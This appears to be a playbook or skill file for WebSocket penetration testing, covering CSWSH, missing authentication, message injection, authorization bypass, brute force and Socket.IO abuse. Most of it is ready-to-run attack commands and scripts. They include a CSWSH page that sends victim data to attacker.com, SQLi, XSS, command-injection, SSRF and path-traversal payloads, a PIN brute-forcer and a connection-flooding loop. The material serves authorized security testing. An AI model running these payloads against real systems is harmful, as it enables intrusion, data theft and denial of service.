---
name: websocket
description: WebSocket protocol security testing covering handshake manipulation, CSWSH, message injection, session hijacking, and Socket.IO specific attacks
mitre_techniques: [T1190]
kill_chain_phases: [initial_access]
---

# WebSocket Protocol Testing

Protocol-level security testing for WebSocket connections. Focus on handshake manipulation, origin bypass, message injection, Cross-Site WebSocket Hijacking (CSWSH), session hijacking, and framework-specific tests for Socket.IO and similar libraries.

## Attack Surface

**Handshake Phase**
- HTTP Upgrade request (Origin, Sec-WebSocket-Key, Sec-WebSocket-Protocol)
- Authentication during upgrade (cookies, tokens, query params)
- Protocol negotiation and subprotocol selection

**Message Phase**
- Text and binary frames
- Application-layer protocol over WebSocket (JSON, protobuf, custom)
- Client-to-server and server-to-client message handling

**Connection Lifecycle**
- Reconnection logic and state resumption
- Ping/pong heartbeat handling
- Connection limits and rate limiting

**Framework-Specific**
- Socket.IO (transport upgrade, namespaces, rooms, acknowledgements)
- SockJS (fallback transports)
- ActionCable, Phoenix Channels, SignalR

## Reconnaissance

```bash
# Identify WebSocket endpoints
# Check JavaScript for WebSocket URLs
curl -s https://target.com/static/js/app.js | grep -oE "wss?://[a-zA-Z0-9._/:-]+"
curl -s https://target.com/ | grep -oiE "(wss?://|new WebSocket|io\.connect|io\()"

# Test WebSocket handshake
websocat -v ws://target.com/ws
websocat -v wss://target.com/ws

# Using wscat
wscat -c ws://target.com/ws

# Raw handshake with curl
curl -v -N \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  https://target.com/ws

# Socket.IO endpoint discovery
curl -s "https://target.com/socket.io/?EIO=4&transport=polling"
curl -s "https://target.com/socket.io/?EIO=3&transport=polling"
```

## Key Vulnerabilities

### Cross-Site WebSocket Hijacking (CSWSH)

When WebSocket auth relies solely on cookies without Origin validation:
```html
<!-- Host on attacker site - victim's browser sends cookies automatically -->
<script>
var ws = new WebSocket("wss://target.com/ws");
ws.onopen = function() {
  // Authenticated as victim via cookies
  ws.send(JSON.stringify({"action":"get_profile"}));
};
ws.onmessage = function(e) {
  // Exfiltrate victim's data
  fetch("https://attacker.com/log?data=" + encodeURIComponent(e.data));
};
</script>
```

Test for CSWSH:
```bash
# Check if Origin header is validated
# Valid origin
websocat -H "Origin: https://target.com" wss://target.com/ws
# Attacker origin
websocat -H "Origin: https://evil.com" wss://target.com/ws
# Null origin (sandboxed iframe)
websocat -H "Origin: null" wss://target.com/ws
# Subdomain bypass
websocat -H "Origin: https://evil.target.com" wss://target.com/ws
# No origin header
websocat --no-origin wss://target.com/ws
```

### Missing Authentication on Upgrade

```bash
# Test WebSocket connection without any credentials
websocat wss://target.com/ws

# Test with only cookies (no token)
websocat -H "Cookie: session=VALID_SESSION" wss://target.com/ws

# Check if auth token in query string is required
websocat "wss://target.com/ws?token=VALID_TOKEN"
websocat "wss://target.com/ws?token="
websocat "wss://target.com/ws"

# Test if auth is checked only at handshake, not per-message
# 1. Connect with valid token
# 2. Invalidate/expire the token (logout in another tab)
# 3. Continue sending messages on existing connection
```

### Message Injection Attacks

```bash
# SQL injection via WebSocket messages
echo '{"action":"search","query":"admin'\'' OR 1=1--"}' | websocat wss://target.com/ws

# XSS via WebSocket (if messages are rendered in DOM)
echo '{"action":"chat","message":"<img src=x onerror=alert(document.cookie)>"}' | websocat wss://target.com/ws

# Command injection
echo '{"action":"ping","host":"127.0.0.1; id"}' | websocat wss://target.com/ws

# SSRF via WebSocket
echo '{"action":"fetch","url":"http://169.254.169.254/latest/meta-data/"}' | websocat wss://target.com/ws

# Path traversal
echo '{"action":"readFile","path":"../../../etc/passwd"}' | websocat wss://target.com/ws

# JSON injection / prototype pollution
echo '{"action":"update","data":{"__proto__":{"admin":true}}}' | websocat wss://target.com/ws
echo '{"action":"update","data":{"constructor":{"prototype":{"admin":true}}}}' | websocat wss://target.com/ws
```

### Authorization Bypass via WebSocket

```bash
# Access admin channels/rooms without admin role
echo '{"action":"subscribe","channel":"admin-notifications"}' | websocat wss://target.com/ws
echo '{"action":"join","room":"internal-dashboard"}' | websocat wss://target.com/ws

# IDOR via WebSocket messages
echo '{"action":"get_messages","user_id":"OTHER_USER_ID"}' | websocat wss://target.com/ws
echo '{"action":"get_account","account_id":"VICTIM_ACCOUNT"}' | websocat wss://target.com/ws

# Privilege escalation via message manipulation
echo '{"action":"update_role","user_id":"MY_ID","role":"admin"}' | websocat wss://target.com/ws
```

### Rate Limiting Absence

```bash
# Rapid message sending (brute force via WebSocket)
python3 -c "
import asyncio, websockets, json
async def brute():
    async with websockets.connect('wss://target.com/ws') as ws:
        for i in range(10000):
            await ws.send(json.dumps({'action':'login','pin':f'{i:04d}'}))
            resp = await ws.recv()
            if 'success' in resp:
                print(f'Found: {i:04d}')
                break
asyncio.run(brute())
"

# Connection flooding
for i in $(seq 1 500); do
  websocat -t wss://target.com/ws &
done
wait
```

### Session Hijacking via WebSocket

```bash
# Token in URL (logged in proxies, referrer, browser history)
# Check if token is passed as query parameter
websocat "wss://target.com/ws?token=LEAKED_TOKEN"

# Test token replay after logout
# 1. Capture valid WebSocket token
# 2. User logs out via HTTP
# 3. Attempt WebSocket connection with captured token

# Check for session fixation
# Connect with attacker-chosen session/ticket ID
websocat "wss://target.com/ws?session=ATTACKER_CHOSEN_ID"
```

### Socket.IO Specific Tests

```bash
# Transport upgrade interception
# Socket.IO starts with HTTP polling then upgrades to WebSocket
# Test if auth is re-validated during transport upgrade
curl -s "https://target.com/socket.io/?EIO=4&transport=polling" | head -20

# Namespace access control
# Default namespace: /
# Test accessing restricted namespaces
python3 -c "
import socketio
sio = socketio.Client()
sio.connect('https://target.com', namespaces=['/admin','/internal','/debug'])
"

# Event name enumeration and unauthorized event emission
python3 -c "
import socketio
sio = socketio.Client()
@sio.on('*')
def catch_all(event, data):
    print(f'Event: {event}, Data: {data}')
sio.connect('https://target.com')
# Emit admin events
sio.emit('admin:getUsers', {})
sio.emit('debug:eval', {'code':'process.env'})
sio.emit('system:restart', {})
"

# Room joining without authorization
python3 -c "
import socketio
sio = socketio.Client()
sio.connect('https://target.com')
sio.emit('join', {'room': 'admin-room'})
sio.emit('join', {'room': 'user-123-private'})
"
```

### Binary Message Fuzzing

```bash
# Send binary frames with malformed data
python3 -c "
import asyncio, websockets
async def fuzz():
    async with websockets.connect('wss://target.com/ws') as ws:
        payloads = [
            b'\x00' * 1000,           # null bytes
            b'\xff' * 1000,           # max bytes
            b'\x00\x01\x02' * 10000, # large binary
            bytes(range(256)) * 100,  # all byte values
            b'',                       # empty
        ]
        for p in payloads:
            await ws.send(p)
            try:
                resp = await asyncio.wait_for(ws.recv(), timeout=2)
                print(f'Payload len {len(p)}: got response')
            except:
                print(f'Payload len {len(p)}: no response/error')
asyncio.run(fuzz())
"
```

## Tools

```bash
# websocat - command-line WebSocket client
websocat wss://target.com/ws

# wscat - Node.js WebSocket client
wscat -c wss://target.com/ws

# Burp Suite - WebSocket interception and modification via Proxy tab
# Caido - WebSocket support in proxy

# Python websockets library for scripted testing
pip install websockets python-socketio
```

## Testing Methodology

1. **Discovery** - Identify WebSocket endpoints from JavaScript, network traffic, documentation
2. **Handshake analysis** - Test Origin validation, auth requirements, protocol negotiation
3. **CSWSH** - Verify cross-origin WebSocket connections are blocked when cookie-authed
4. **Auth testing** - Test unauthenticated access, token replay, session fixation
5. **Message injection** - Fuzz all message fields for SQLi, XSS, command injection, SSRF
6. **Authorization** - Test channel/room access, IDOR in message fields, privilege escalation
7. **Rate limiting** - Verify message rate limits, connection limits, brute force protection
8. **Framework-specific** - Socket.IO namespaces, transport upgrades, event authorization
9. **Binary fuzzing** - Send malformed binary frames, oversized messages, edge case payloads

## Validation

- Demonstrate CSWSH by connecting from attacker origin with victim's cookies and reading data
- Show missing authentication allowing unauthenticated WebSocket access to sensitive functionality
- Prove message injection (SQLi/XSS/RCE) through WebSocket message fields
- Document authorization bypass accessing other users' channels or data via WebSocket
- Show rate limiting absence enabling brute force attacks over WebSocket

## Impact

- Cross-site data theft via CSWSH when Origin header is not validated
- Full account takeover if WebSocket session tokens are exposed or replayable
- Server-side injection (SQL, command, SSRF) through unvalidated WebSocket message fields
- Real-time data exfiltration from unauthorized channel/room subscriptions
- Denial of service via connection flooding or message rate abuse
